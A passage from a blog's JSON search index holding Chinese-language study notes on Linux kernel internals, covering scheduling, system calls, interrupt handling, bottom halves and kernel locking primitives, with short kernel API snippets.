\u6269\u5c55\u7279\u6027<ul> <li>\u5185\u8054\u51fd\u6570</li> <li>\u5185\u8054\u6c47\u7f16</li> </ul> </li> </ul>","tags":["kernel","linux"]},{"location":"%E9%98%85%E8%AF%BB/2021/01/01/2021-01-01-linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%E9%98%85%E8%AF%BB/#\u8fdb\u7a0b\u8c03\u5ea6","title":"\u8fdb\u7a0b\u8c03\u5ea6","text":"<ul> <li>\u6bcf\u4e2a CPU \u90fd\u6709\u5355\u72ec\u7684\u8fd0\u884c\u961f\u5217 runqueue\uff0c\u6bcf\u4e2a runqueue \u5b9e\u9645\u5305\u542b\u4e24\u4e2a prio_array \u7ed3\u6784\u7684\u6570\u636e active, expire\u3002active \u8bb0\u5f55\u65f6\u95f4\u7247\u8fd8\u6ca1\u6709\u8fd0\u884c\u5b8c\u7684\u8fdb\u7a0b\uff0cexpire \u5219\u662f\u8fd0\u884c\u5b8c\u7684\u3002prio_array \u5305\u542b\u4e00\u4e2a bitmap \u548c\u5b9e\u9645\u7684\u5bf9\u5e94\u4e0d\u540c\u4f18\u5148\u7ea7\u7684\u8fdb\u7a0b\u94fe\u8868 struct list_head queue\uff08queue[MAX_PRIO]\uff09\uff0c\u8c03\u5ea6\u65f6 schedule():/kernel/sched.c \u66f4\u5177 bitmap \u627e\u5230\u975e\u7a7a\u7684\u6700\u9ad8\u4f18\u5148\u7ea7\u7684\u94fe\u8868\u7684\u7b2c\u4e00\u4e2a\u8fdb\u7a0b\u4f5c\u4e3a\u5168\u5c40\u4f18\u5148\u7ea7\u6700\u9ad8\u7684\u8fdb\u7a0b\u3002</li> </ul> <ul> <li>\u91cd\u65b0\u5206\u914d\u65f6\u95f4\u7247\uff0ctask_timeslice() \u6839\u636e\u4efb\u52a1\u7684\u9759\u6001\u4f18\u5148\u7ea7\uff08\u7528\u6237\u6307\u5b9a\u7684 nice \u503c\uff09\u5206\u914d\u65f6\u95f4\u7247\u3002\u9ed8\u8ba4 nice \u4e3a 0 \u4e3a 100ms\u3002</li> </ul> <ul> <li>\u964d\u4f4e\u4ea4\u4e92\u8fdb\u7a0b\u54cd\u5e94\u65f6\u95f4\uff1a\u6bcf\u4e2a\u5b9a\u65f6\u5668\u4e2d\u65ad\u4f1a\u8c03\u7528 scheduler_tick()\uff0c\u8be5\u51fd\u6570\u51cf\u5c11\u4efb\u52a1\u7684\u65f6\u95f4\u7247\uff0c\u5982\u679c\u51cf\u4e3a 0 \u4e86\uff0c\u5219\u5224\u65ad\u8be5\u8fdb\u7a0b\u662f\u5426\u4e3a\u4ea4\u4e92\u6027\u8fdb\u7a0b\uff0c\u5982\u679c\u4e0d\u662f\uff0c\u5219\u6dfb\u52a0\u5230 expired \u961f\u5217\u4e2d\uff0c\u5982\u679c\u662f\u4e14\u6ca1\u6709\u53d1\u751f expired \u961f\u5217\u9965\u997f\u65f6\uff0c\u7ee7\u7eed\u6dfb\u52a0\u5230 active \u961f\u5217</li> </ul> <ul> <li> <p>schedule \u9009\u62e9\u4e86\u4e0b\u4e00\u4e2a\u8fdb\u7a0b\u540e\uff0c\u4fbf\u901a\u8fc7 contex_switch \u5b8c\u6210\u4e0a\u4e0b\u6587\u4ea4\u6362\u3002\u8be5\u51fd\u6570\u901a\u8fc7\u5219\u8fdb\u4e00\u6b65\u901a\u8fc7\u4ee5\u4e0b\u4e24\u4e2a\u51fd\u6570\u5b9e\u73b0</p> <ul> <li>asm/mmu_contex.h:switch_mm\uff1a\u5207\u6362\u865a\u62df\u5185\u5b58</li> <li>asm/system.h:switch_to\uff1a\u5b9e\u73b0\u5904\u7406\u5668\u72b6\u6001\u5207\u6362</li> </ul> </li> </ul> <ul> <li> <p>\u4ec0\u4e48\u65f6\u5019\u8c03\u7528 sechdule</p> <ul> <li>\u5185\u6838\u901a\u8fc7 need_resched \u6807\u5fd7\u6765\u8868\u660e\u662f\u5426\u9700\u8981\u91cd\u65b0\u6267\u884c\u4e00\u6b21\u8c03\u5ea6\u3002<ul> <li>\u5f53\u65f6\u95f4\u7247\u8017\u5c3d\u65f6 scheduler_tick \u8bbe\u7f6e</li> <li>\u5f53\u66f4\u9ad8\u4f18\u5148\u7ea7\u7684\u8fdb\u7a0b\u8fdb\u5165\u53ef\u6267\u884c\u72b6\u6001\u65f6\uff0ctry_to_wake_up \u8bbe\u7f6e</li> </ul> </li> </ul> <ul> <li> <p>\u7528\u6237\u62a2\u5360</p> <p>\u5f53\u5185\u6838\u5373\u5c06\u8fd4\u56de\u5230\u7528\u6237\u7a7a\u95f4\u65f6\uff0c\u5982\u679c need_resched \u88ab\u8bbe\u7f6e\uff0c\u90a3\u4e48\u5c31\u4f1a\u8c03\u7528 schedule\uff0c\u4ece\u800c\u53d1\u751f\u7528\u6237\u62a2\u5360</p> </li> </ul> <ul> <li> <p>\u5185\u6838\u62a2\u5360</p> <p>linux \u5b9e\u73b0\u4e86\u5185\u6838\u62a2\u5360\u3002\u5728\u4e0d\u652f\u6301\u5185\u6838\u62a2\u5360\u7684\u7cfb\u7edf\u4e2d\uff0c\u5185\u6838\u4ee3\u7801\u53ef\u4ee5\u4e00\u76f4\u6267\u884c\u3002</p> </li> </ul> <ul> <li> <p>\u5b9e\u65f6</p> <p>linux \u652f\u6301 SCHED_FIFO \u548c SCHED_RR \u4e24\u79cd\u8bd5\u8bd5\u8c03\u5ea6\u7b56\u7565\u3002FIFO \u4e0d\u9002\u7528\u65f6\u95f4\u7247\uff0c\u4f1a\u6bd4\u4efb\u4f55 SCHED_NORMAL \u7684\u8fdb\u7a0b\u90fd\u5148\u5f97\u5230\u8c03\u5ea6\u3002\u4e00\u65e6\u4e00\u4e2a SCHED_FIFO \u5904\u4e8e\u6267\u884c\u72b6\u6001\u5c31\u4f1a\u4e00\u76f4\u6267\u884c\uff0c\u76f4\u5230\u663e\u793a\u91ca\u653e\u5904\u7406\u5668\u4e3a\u6b62\u3002</p> </li> </ul> </li> </ul>","tags":["kernel","linux"]},{"location":"%E9%98%85%E8%AF%BB/2021/01/01/2021-01-01-linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%E9%98%85%E8%AF%BB/#\u7cfb\u7edf\u8c03\u7528","title":"\u7cfb\u7edf\u8c03\u7528","text":"<ul> <li>\u7cfb\u7edf\u8c03\u7528\u5e94\u8be5\u63d0\u4f9b\u673a\u5236 (mechanism)\uff08\u9700\u8981\u63d0\u4f9b\u4ec0\u4e48\u529f\u80fd\uff09\u800c\u4e0d\u662f\u7b56\u7565 (policy)\uff08\u600e\u4e48\u4f7f\u7528\u8fd9\u4e9b\u529f\u80fd\uff09\uff08\u9a71\u52a8\u8bbe\u8ba1\u4e5f\u5e94\u8be5\u8fd9\u6837\uff09</li> <li>\u7cfb\u7edf\u8c03\u7528\u5185\u6838\u5b9e\u73b0\uff0c\u9700\u8981\u5728\u51fd\u6570\u524d\u6dfb\u52a0 asmlinkage \u9650\u5b9a\u8bcd\uff0c\u544a\u8bc9\u7f16\u8bd1\u5668\u4ec5\u4ece\u6808\u4e2d\u63d0\u53d6\u8be5\u51fd\u6570\u7684\u53c2\u6570\u3002<ul> <li>\u5728\u5185\u9677\u5230\u5185\u6838\u7a7a\u95f4\u4e4b\u524d\uff0c\u9700\u8981\u5c06\u7cfb\u7edf\u8c03\u7528\u53f7\u548c\u53c2\u6570\u90fd\u653e\u5230\u5bc4\u5b58\u5668\u91cc\uff08\u591a\u4e8e 5 \u4e2a\u5219\u4f20\u9012\u4e00\u4e2a\u7528\u6237\u7a7a\u95f4\u6307\u9488\uff09\uff0c\u7136\u540e\u89e6\u53d1\u8f6f\u4e2d\u65ad (int $0x80)\uff0c\u6267\u884c 128 \u53f7\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u3002\u8be5\u7a0b\u5e8f\u5bf9\u5e94\u7cfb\u7edf\u8c03\u7528\u5904\u7406\u7a0b\u5e8f system_call\uff0c\u5728 entry.S \u4e2d\u7528\u6c47\u7f16\u5b9e\u73b0\u3002system_call \u518d\u5c06\u53c2\u6570\uff08\u4ece\u5bc4\u5b58\u5668\u4e2d\u83b7\u5f97\uff09\u4f20\u9012\u7ed9\u771f\u6b63\u7684\u7cfb\u7edf\u8c03\u7528\u51fd\u6570 sys_xxx\u3002</li> <li>\u5728\u770b\u8fc7\u7684 mips ucore \u4e2d\u5b9e\u73b0\u4e2d\uff0csystem_call \u4e0d\u662f\u7528\u6c47\u7f16\u5b9e\u73b0\u7684\uff0c\u5df2\u7ecf\u662f C \u4e86\u3002\u53c2\u6570\u4e4b\u7c7b\u7684\u90fd\u653e\u5728\u4e2d\u65ad\u5e27\uff08\u5185\u6838\u6808\u4e2d\u4e00\u4e2a\u6570\u636e\u7ed3\u6784\uff09\u91cc\uff08\u5305\u542b\u5404\u79cd\u5bc4\u5b58\u5668\uff09</li> <li>x86-64 \u4e2d\u6dfb\u52a0\u4e86 sysenter \u7684\u6307\u4ee4</li> </ul> </li> <li>copy_to_user \u548c copy_from_user</li> <li>\u5373\u4f7f\u6dfb\u52a0\u4e86\u81ea\u5df1\u7684\u7cfb\u7edf\u8c03\u7528\uff0c\u7531\u4e8e libc \u5e93\u6ca1\u6709\u8fdb\u884c wrap\uff0c\u56e0\u6b64\u7528\u6237\u7a0b\u5e8f\u9700\u8981\u901a\u8fc7\u6c47\u7f16\u8fdb\u884c\u7cfb\u7edf\u8c03\u7528\u3002linux \u63d0\u4f9b\u4e86\u76f8\u5173\u5b8f\u2014\u2014<code>_syscalln</code>\uff0c\u7b80\u5316\u4e86\u8be5\u6b65\u9aa4</li> </ul>","tags":["kernel","linux"]},{"location":"%E9%98%85%E8%AF%BB/2021/01/01/2021-01-01-linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%E9%98%85%E8%AF%BB/#\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f","title":"\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f","text":"<ul> <li> <p>\u4e2d\u65ad\u4e0a\u4e0b\u6587\uff1a</p> <p>\u5f53\u6267\u884c\u7cfb\u7edf\u8c03\u7528\u6216\u8fd0\u884c\u5185\u6838\u7ebf\u7a0b\u65f6\uff0c\u5185\u6838\u5904\u4e8e\u8fdb\u7a0b\u4e0a\u4e0b\u6587\u3002\u800c\u5f53\u5185\u6838\u6267\u884c\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u65f6\uff0c\u5185\u6838\u5904\u4e8e\u4e2d\u65ad\u4e0a\u4e0b\u6587\u3002</p> <p>\u4e2d\u65ad\u6808\uff1a\u66fe\u4eca\uff0c\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u5171\u4eab\u88ab\u4e2d\u65ad\u8fdb\u7a0b\u7684\u5185\u6838\u6808\u30022.6 \u7248\u672c\u540e\uff0c\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u6709\u4e86\u81ea\u5df1\u7684\u6808\uff0c\u5927\u5c0f\u4e3a 1 \u4e2a\u9875\uff0c\u5373 4KB\u3002</p> </li> </ul> <ul> <li>\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u4e0d\u518d\u8fdb\u7a0b\u4e0a\u4e0b\u6587\u4e2d\u8fd0\u884c\uff0c\u56e0\u6b64\u4e0d\u80fd\u963b\u585e</li> </ul> <ul> <li> <p>\u8fc7\u7a0b</p> <ul> <li> <p>\u6ce8\u518c\u4e2d\u65ad</p> <pre><code>int request_irq(unsigned int irq,\n    irqreturn_t (*handler)(int, void *, struct pt_regs *)),\n    unsigned long irqflags,\n    const char *devname,\n    void *dev_id)\n</code></pre> <ul> <li>irq \u4e3a\u8981\u5206\u914d\u7684\u4e2d\u65ad\u53f7\uff0c\u5bf9\u4e8e\u4f20\u7edf PC \u8bbe\u5907\uff0c\u8be5\u503c\u901a\u5e38\u662f\u9884\u5148\u5b9a\u4e49\u7684</li> </ul> <ul> <li>handler \u4e3a\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f</li> </ul> <ul> <li>irqflags<ul> <li>SA_INTERRUPT\uff1a\u5feb\u901f\u4e2d\u65ad\uff0c\u5728\u7981\u6b62\u672c\u5730 CPU \u4e0a\u7684\u6240\u6709\u4e2d\u65ad\u60c5\u51b5\u4e0b\u8fd0\u884c\u3002</li> <li>SA_SHIRQ\uff1a\u5171\u4eab\u4e2d\u65ad\u7ebf</li> </ul> </li> </ul> </li> </ul> <ul> <li> <p>\u5904\u7406\u5668\u67d0\u7ba1\u811a\u63a5\u6536\u5230\u8bbe\u5907\u4e2d\u65ad\u4fe1\u53f7\uff0c\u5173\u95ed\u4e2d\u65ad\u7cfb\u7edf\uff0c\u8df3\u8f6c\u5230\u4e2d\u65ad\u7a0b\u5e8f\u5165\u53e3\u70b9\u5f00\u59cb\u6267\u884c</p> <p>\u6ce8\uff1ax86 \u4e2d\uff0c\u5bf9\u4e8e\u6bcf\u4e2a\u4e2d\u65ad\u53f7\u90fd\u4f1a\u8df3\u8f6c\u5230\u4e0d\u540c\u5165\u53e3\u70b9</p> </li> </ul> <ul> <li> <p>\u5165\u53e3\u70b9\u4ee3\u7801\u5c06\u4e2d\u65ad\u53f7\u538b\u6808\uff0c\u5b58\u653e\u5bc4\u5b58\u5668\uff0c\u7136\u540e\u8c03\u7528 do_IRQ()</p> <pre><code>unsigned int do_IRQ(struct pt_regs regs)\n</code></pre> </li> </ul> <ul> <li> <p>do_IRQ \u5224\u65ad\u4e2d\u65ad\u7ebf\u4e0a\u662f\u5426\u6709\u6ce8\u518c\u7684\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\uff0c\u5e76\u8c03\u7528 handle_IRQ_event \u8fdb\u884c\u5904\u7406\u3002</p> <p>\u6ce8 1\uff1a\u524d\u9762\u8bf4\u5230\uff0cCPU \u63a5\u6536\u5230\u4e2d\u65ad\u540e\uff0c\u5173\u95ed\u4e86\u4e2d\u65ad\u7cfb\u7edf\u3002\u5728\u8fd9\u91cc\uff0c\u5982\u679c IRQ \u7c7b\u578b\u4e0d\u662f SA_INTERRUPT\uff0c\u5219\u4f1a\u91cd\u65b0\u6253\u5f00\u4e2d\u65ad\u3002</p> <p>\u6ce8 2\uff1a\u5171\u4eab\u4e2d\u65ad\u7ebf\u7684\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\uff1a\u4f9d\u6b21\u8c03\u7528\u5728\u8be5\u4e2d\u65ad\u7ebf\u4e0a\u6ce8\u518c\u7684\u6bcf\u4e00\u4e2a\u7a0b\u5e8f\u3002\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u9700\u8981\u5224\u65ad\u662f\u5426\u81ea\u5df1\u6ce8\u518c\u7684\u8bbe\u5907\u4ea7\u751f\u4e86\u4e2d\u65ad\uff08\u901a\u8fc7\u68c0\u67e5\u786c\u4ef6\u72b6\u6001\u5bc4\u5b58\u5668\uff09</p> </li> </ul> <ul> <li>\u6ca1\u6709\u6216\u8005\u5904\u7406\u5b8c\u540e\uff0c\u5219\u8c03\u7528 ret_from_intr() \u8fdb\u884c\u4e2d\u65ad\u8fd4\u56de\u3002</li> </ul> </li> </ul>","tags":["kernel","linux"]},{"location":"%E9%98%85%E8%AF%BB/2021/01/01/2021-01-01-linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%E9%98%85%E8%AF%BB/#\u4e0b\u534a\u90e8","title":"\u4e0b\u534a\u90e8","text":"<ul> <li> <p>\u4e0a\u534a\u90e8\u548c\u4e0b\u534a\u90e8</p> <ul> <li>\u4e00\u4e2a\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u6b63\u5728\u6267\u884c\u65f6\uff0c\u540c\u4e00\u4e2a\u4e2d\u65ad\u7ebf\u5728\u6240\u6709\u5904\u7406\u5668\u4e0a\u90fd\u4f1a\u88ab\u9891\u95ed\u6389\u3002</li> <li>\u56e0\u6b64\u540c\u4e00\u4e2a\u4e2d\u65ad\u7a0b\u5e8f\u4e0d\u4f1a\u88ab\u5d4c\u5957\u8c03\u7528\uff0c\u4ece\u800c\u7b80\u5316\u4e86\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u7684\u7f16\u5199\u3002</li> </ul> <ul> <li>\u5bf9\u4e8e SA_INTERRUPT \u7c7b\u578b\u4e2d\u65ad\uff0c\u672c\u5730\u5904\u7406\u5668\u7684\u6240\u6709\u4e2d\u65ad\u88ab\u7981\u7528</li> <li>\u7f29\u77ed\u4e2d\u65ad\u88ab\u5c4f\u853d\u65f6\u95f4\u5bf9\u7cfb\u7edf\u54cd\u5e94\u65f6\u95f4\u548c\u6027\u80fd\u5f88\u91cd\u8981</li> </ul> </li> </ul> <ul> <li> <p>\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u5fc5\u987b\u5c3d\u53ef\u80fd\u5feb\u901f\u7684\u5b8c\u6210\uff0c\u56e0\u6b64\u6574\u4e2a\u4e2d\u65ad\u5904\u7406\u6d41\u7a0b\u88ab\u5206\u4e3a\u4e86\u4e0a\u4e0b\u4e24\u90e8\u5206\u3002\u5e94\u5c3d\u53ef\u80fd\u5c06\u4efb\u52a1\u653e\u5230\u4e0b\u534a\u90e8\u6267\u884c\uff0c\u9664\u4e86\u4ee5\u4e0b\u60c5\u51b5\uff1a</p> <ul> <li>\u5bf9\u65f6\u95f4\u975e\u5e38\u654f\u611f</li> <li>\u548c\u786c\u4ef6\u76f8\u5173</li> <li>\u8981\u4fdd\u8bc1\u4e0d\u88ab\u5176\u4ed6\u4e2d\u65ad\u6253\u65ad</li> </ul> </li> </ul> <ul> <li> <p>\u5185\u6838\u5b9e\u73b0\u4e0b\u534a\u90e8\u7684\u65b9\u5f0f\uff1a</p> <ul> <li>\u8f6f\u4e2d\u65ad (2.3)</li> <li>tasklet(2.3)</li> <li>workqueue(2.5)</li> </ul> </li> </ul> <ul> <li> <p>\u8f6f\u4e2d\u65ad</p> <ul> <li>\u4e00\u4e2a 32 \u4e2a\u8868\u9879\u6570\u7ec4\u7528\u4e8e\u6ce8\u518c\u8f6f\u4e2d\u65ad\u3002</li> <li>do_softirq()</li> <li>\u4ec0\u4e48\u65f6\u5019\u89e6\u53d1\u8f6f\u4e2d\u65ad<ul> <li>\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u9000\u51fa\u524d</li> <li>\u5728 ksoftirq/n \u5185\u6838\u7ebf\u7a0b\u4e2d</li> </ul> </li> <li>\u907f\u514d\u52a0\u9501\u6765\u63d0\u9ad8\u6027\u80fd</li> <li>\u76f8\u540c\u7c7b\u522b\u7684\u8f6f\u4e2d\u65ad\u53ef\u80fd\u5728\u4e0d\u540c\u5904\u7406\u5668\u4e0a\u540c\u65f6\u6267\u884c</li> </ul> </li> </ul> <ul> <li> <p>tasklet</p> <ul> <li>\u57fa\u4e8e\u8f6f\u4e2d\u65ad\u5b9e\u73b0</li> </ul> <ul> <li>\u4e0d\u540c\u7c7b\u578b\u7684 tasklet\uff1aHI_SOFTIRQ, TASKLET_SOFTIRQ\u3002</li> <li>\u76f8\u540c\u7c7b\u522b\u7684 tasklet \u4e0d\u80fd\u540c\u65f6\u6267\u884c\uff0c\u4e0d\u540c\u7c7b\u578b tasklet \u53ef\u4ee5\u540c\u65f6\u6267\u884c</li> <li>\u907f\u514d\u8f6f\u4e2d\u65ad\u5904\u7406\u51fd\u6570\u6709\u89e6\u53d1\u8f6f\u4e2d\u65ad\uff0c\u5bfc\u81f4\u7528\u6237\u7a7a\u95f4\u8fdb\u7a0b\u9965\u997f\u3002\u5f15\u5165 ksoftirq\uff0c\u5f53\u5927\u91cf\u8f6f\u4e2d\u65ad\u51fa\u73b0\u65f6\uff0c\u5185\u6838\u5524\u9192\u4e00\u7ec4\u5185\u6838\u7ebf\u7a0b\u6765\u5904\u7406\u8fd9\u4e9b\u8d1f\u8f7d\uff0c\u8fd0\u884c\u5728\u6700\u4f4e\u4f18\u5148\u7ea7\uff08nice \u503c\u4e3a 19\uff09\uff0c\u4fdd\u8bc1\u6700\u7ec8\u80af\u5b9a\u4f1a\u88ab\u6267\u884c\u3002</li> </ul> </li> </ul> <ul> <li> <p>workqueue</p> <ul> <li>\u53ef\u4ee5\u963b\u585e</li> <li>\u7531\u5185\u6838\u7ebf\u7a0b\u4ee3\u4e3a\u6267\u884c\uff08\u4e00\u822c\u4f7f\u7528\u9ed8\u8ba4\u7684\uff0c\u4e5f\u53ef\u4ee5\u81ea\u5df1\u521b\u5efa\uff09\uff0c\u53ef\u4ee5\u8c03\u5ea6</li> </ul> </li> </ul>","tags":["kernel","linux"]},{"location":"%E9%98%85%E8%AF%BB/2021/01/01/2021-01-01-linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%E9%98%85%E8%AF%BB/#\u5185\u6838\u540c\u6b65\u4ecb\u7ecd","title":"\u5185\u6838\u540c\u6b65\u4ecb\u7ecd","text":"<ul> <li>\u7528\u6237\u7a0b\u5e8f\u5e76\u53d1\u6267\u884c\u60c5\u5f62<ul> <li>\u4f2a\u5e76\u53d1\uff1a\u8fdb\u7a0b\u88ab\u62a2\u5360\uff0c\u5e76\u91cd\u65b0\u8c03\u5ea6\u3002\u5728\u88ab\u62a2\u5360\u671f\u95f4\uff0c\u53e6\u4e00\u4e2a\u8fdb\u7a0b\u53ef\u80fd\u8bbf\u95ee\u4e34\u754c\u533a</li> <li>\u591a\u6838\u5904\u7406\u5668\uff0c\u8fdb\u7a0b\u5e76\u884c\u6267\u884c\uff08\u771f\u5e76\u53d1\uff09</li> </ul> </li> </ul> <ul> <li>\u5185\u6838\u5e76\u53d1\u6267\u884c\u60c5\u5f62<ul> <li>\u5185\u6838\u4e5f\u652f\u6301\u62a2\u5360\u8c03\u5ea6\uff08\u6362\u53e5\u8bdd\u8bf4\uff0c\u5982\u679c\u5185\u6838\u4e0d\u652f\u6301\u62a2\u5360\uff0c\u90a3\u4e48\u5355\u6838\u60c5\u51b5\uff0c\u5185\u6838\u6b63\u5e38\u60c5\u51b5\u5c31\u4e0d\u4f1a\u9047\u5230\u5e76\u53d1\u95ee\u9898\uff09</li> <li>\u4e2d\u65ad</li> <li>SMP</li> </ul> </li> </ul> <ul> <li>\u5728\u5199\u4ee3\u7801\u65f6\u5c31\u9700\u8981\u8003\u8651\u52a0\u9501\uff0c\u800c\u4e0d\u662f\u5199\u5b8c\u4e86\u4e4b\u540e\u518d\u52a0\u9501</li> <li>\u4e2d\u65ad\u5b89\u5168\u4ee3\u7801</li> <li>SMP \u5b89\u5168\u4ee3\u7801</li> <li>\u62a2\u5360\u5b89\u5168\u4ee3\u7801</li> <li>\u521a\u5f00\u59cb\u9501\u7684\u7c92\u5ea6\u90fd\u5f88\u7c97\uff0c\u4f46\u662f\u5f53\u9501\u7684\u7ade\u4e89\u53d8\u5f97\u4e25\u91cd\u65f6\uff0c\u8bbe\u8ba1\u5c31\u5411\u66f4\u7cbe\u7ec6\u7684\u52a0\u9501\u65b9\u5411\u8fdb\u5316</li> </ul>","tags":["kernel","linux"]},{"location":"%E9%98%85%E8%AF%BB/2021/01/01/2021-01-01-linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0%E9%98%85%E8%AF%BB/#\u5185\u6838\u540c\u6b65\u5b9e\u73b0","title":"\u5185\u6838\u540c\u6b65\u5b9e\u73b0","text":"<ul> <li> <p>\u539f\u5b50\u64cd\u4f5c</p> <ul> <li>\u539f\u5b50\u64cd\u4f5c\uff0c\u6bd4\u5982 atomic_inc() \u9700\u8981\u5c06\u5185\u5b58\u4e2d\u4e00\u4e2a\u53d8\u91cf\u52a0 1\u3002\u539f\u5b50\u64cd\u4f5c\u9700\u8981\u786c\u4ef6\u652f\u6301</li> <li>\u539f\u5b50\u6027\u548c\u987a\u5e8f\u6027\uff1a\u539f\u5b50\u6027\u8868\u793a\u64cd\u4f5c\u662f\u4e0d\u53ef\u5206\u5272\u7684\uff0c\u8981\u4e48\u6267\u884c\u5b8c\u8981\u4e48\u4e0d\u6267\u884c\u3002\u800c\u540c\u6b65\u6027\u8868\u793a\u591a\u6761\u6307\u4ee4\u5373\u4f7f\u6267\u884c\u5728\u591a\u4e2a\u6838\u4e0a\uff0c\u4ed6\u4eec\u95f4\u7684\u987a\u5e8f\u4e5f\u4f9d\u7136\u8981\u4fdd\u6301\u3002\u901a\u8fc7\u5c4f\u969c (barrier) \u5b9e\u73b0</li> </ul> </li> </ul> <ul> <li> <p>\u9501</p> <ul> <li>\u4e34\u754c\u533a\u8981\u8fdb\u884c\u7684\u64cd\u4f5c\u53ef\u80fd\u975e\u5e38\u590d\u6742\uff0c\u56e0\u6b64\u65e0\u6cd5\u4ec5\u4f7f\u7528\u7b80\u5355\u7684\u539f\u5b50\u64cd\u4f5c\u3002\u6b64\u65f6\u4fbf\u9700\u8981\u5f15\u5165\u9501\u7684\u673a\u5236\u3002</li> </ul> <ul> <li> <p>\u81ea\u65cb\u9501 spinlock\uff1a</p> <ul> <li>\u81ea\u65cb\u9501\u6700\u591a\u53ea\u80fd\u88ab\u4e00\u4e2a\u7ebf\u7a0b\u6301\u6709</li> </ul> <ul> <li>\u5f53\u4e00\u4e2a\u7ebf\u7a0b\u8bd5\u56fe\u83b7\u5f97\u4e00\u4e2a\u5df2\u7ecf\u88ab\u6301\u6709\u7684\u9501\u65f6\uff0c\u5c31\u4f1a\u8fdb\u5165\u5faa\u73af\u5fd9\u7b49\u5f85\uff0c\u76f4\u5230\u9501\u88ab\u91ca\u653e\u3002</li> </ul> <ul> <li>\u9002\u7528\u4e8e\u5c0f\u7684\u4e34\u754c\u533a</li> </ul> <ul> <li>\u53ef\u4ee5\u5728\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u4e2d\u4f7f\u7528\uff08\u4e0d\u4f1a\u8fdb\u5165\u7761\u7720\uff09</li> </ul> <ul> <li> <p>\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u83b7\u53d6\u81ea\u65cb\u9501\u4e4b\u524d\uff0c\u9700\u8981\u7981\u6b62\u672c\u5730\u4e2d\u65ad\u3002\u5426\u5219\uff0c\u5176\u5b83\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u53ef\u80fd\u6253\u65ad\u5f53\u524d\u4ee3\u7801\uff0c\u5e76\u8bd5\u56fe\u53bb\u83b7\u5f97\u5df2\u7ecf\u88ab\u6301\u6709\u7684\u9501\uff0c\u9020\u6210\u6b7b\u9501\u3002</p> <ul> <li><code>spin_lock_irqsave(&amp;mr_lock, flags)   ...//\u4e34\u754c\u533a   spin_unlock_irqrestore(&amp;mr_lock, flags)</code></li> </ul> </li> </ul> <ul> <li> <p>\u8bfb/\u5171\u4eab/S \u9501\uff0c\u5199/\u6392\u5b83/X \u9501</p> <p>\u5f53\u6709\u5927\u91cf\u8bfb\u9501\u88ab\u5360\u6709\u65f6\uff0c\u53ef\u80fd\u5bfc\u81f4\u5199\u8005\u9965\u997f</p> </li> </ul> </li> </ul> <ul> <li> <p>\u4fe1\u53f7\u91cf</p> <ul> <li>\u4e00\u4e2a\u4efb\u52a1\u8bd5\u56fe\u83b7\u5f97\u4e00\u4e2a\u88ab\u5360\u7528\u7684\u4fe1\u53f7\u91cf\u65f6\uff0c\u4fe1\u53f7\u91cf\u5c06\u5176\u63a8\u8fdb\u4e00\u4e2a\u7b49\u5f85\u961f\u5217\uff0c\u7136\u540e\u8ba9\u5176\u7761\u7720\u3002\u5f53\u6301\u6709\u4fe1\u53f7\u91cf\u7684\u8fdb\u7a0b\u5c06\u4fe1\u53f7\u91cf\u91ca\u653e\u540e\uff0c\u5c06\u7b49\u5f85\u961f\u5217\u4e2d\u7684\u4efb\u52a1\u5524\u9192\uff0c\u5e76\u83b7\u5f97\u8be5\u4fe1\u53f7\u91cf</li> <li>\u4fe1\u53f7\u91cf\u652f\u6301\u591a\u4e2a\u8fdb\u7a0b\u6301\u6709\u540c\u4e00\u4e2a\u4fe1\u53f7\u91cf\uff0c\u5728\u58f0\u660e\u4fe1\u53f7\u91cf\u65f6\u6307\u5b9a\uff0c\u79f0\u4e3a\u4f7f\u7528\u8005\u6570\u91cf\u3002\u4e3a 1 \u65f6\u5219\u662f\u4e8c\u503c\u4fe1\u53f7\u91cf</li> <li>\u4fe1\u53f7\u91cf\u652f\u6301\u4e24\u4e2a\u539f\u5b50\u64cd\u4f5c\uff0cP(), V()\uff0c\u6765\u81ea\u8377\u5170\u8bed Proberen(\u63a2\u67e5), Vershogen(\u589e\u52a0)\u3002linux \u4e2d\u53eb\u505a down() \u548c up()\u3002</li> </ul> </li> </ul> <ul> <li> <p>seq \u9501\uff1a\u8bfb\u4e4b\u524d\u4fdd\u5b58\u4e00\u4e2a\u5e8f\u5217\u503c\uff0c\u8bfb\u64cd\u4f5c\u4e4b\u540e\u518d\u68c0\u67e5\u4ee5\u4e0b\u5e8f\u5217\u503c\u662f\u5426\u53d8\u5316\u3002\u6ca1\u53d8\u5316\u5219\u8bf4\u660e\u4e34\u754c\u533a\u65f6\u6ca1\u6709\u5199\u64cd\u4f5c\u53d1\u751f\uff0c\u5426\u5219\u5faa\u73af\u91cd\u65b0\u8bfb\u53d6\u3002\u5bf9\u5199\u8005\u6709\u5229\u3002</p> <ul> <li> <p>```c   write_seqlock(&amp;sl)   ...   write_sequnlock(&amp;sl)</p> <p>do{  seq = read_seqbegin(&amp;sl)  ... 